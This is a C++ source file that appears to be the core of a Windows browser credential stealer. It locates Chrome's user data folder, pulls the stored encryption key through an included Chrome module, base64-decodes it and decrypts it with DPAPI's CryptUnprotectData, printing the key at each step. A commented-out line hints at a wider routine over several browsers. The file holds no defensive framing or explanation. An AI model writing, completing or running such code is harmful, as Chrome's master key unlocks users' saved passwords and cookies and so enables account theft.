#include <iostream>
#include <array>
#include <chrono>
#include <windows.h>
#pragma comment(lib, "Crypt32")

#include "components/chrome.h"
#include "utils/db.h"
#include "../contrib/base64.h"

std::string decryptToken(const std::string& cipher_text) {
    DATA_BLOB input;
    input.pbData = const_cast<BYTE*>(reinterpret_cast<const BYTE*>(cipher_text.data()));
    input.cbData = static_cast<DWORD>(cipher_text.length());
    DATA_BLOB output;
    BOOL result = ::CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr,
                                       CRYPTPROTECT_UI_FORBIDDEN, &output);

    if (!result){
        std::cerr << "error: " << result << std::endl;
        return std::string();
    }

    std::string refresh_token(reinterpret_cast<char*>(output.pbData),
                              output.cbData);
    ::LocalFree(output.pbData);
    return refresh_token;
}

int main(){
    srand(std::chrono::duration_cast<std::chrono::nanoseconds>(std::chrono::high_resolution_clock::now().time_since_epoch()).count());
    std::cout << std::boolalpha;

    //std::cout << Chrome::run(std::filesystem::temp_directory_path().string() + "\\browsers")  << std::endl;

    std::string const userDataPath{std::string(std::getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\"};

    std::string encryptedTokenb64{Chrome::getEncryptionKey(userDataPath)};

    std::cout << "'" << encryptedTokenb64 << "'" << std::endl << std::endl;

    std::string encryptedToken{base64_decode(encryptedTokenb64)};

    std::cout << "'" << encryptedToken << "'" << std::endl << std::endl;

    std::string decryptedToken{decryptToken(encryptedToken)};

    std::cout << "'" << decryptedToken << "'" << std::endl << std::endl;

    return 0;
}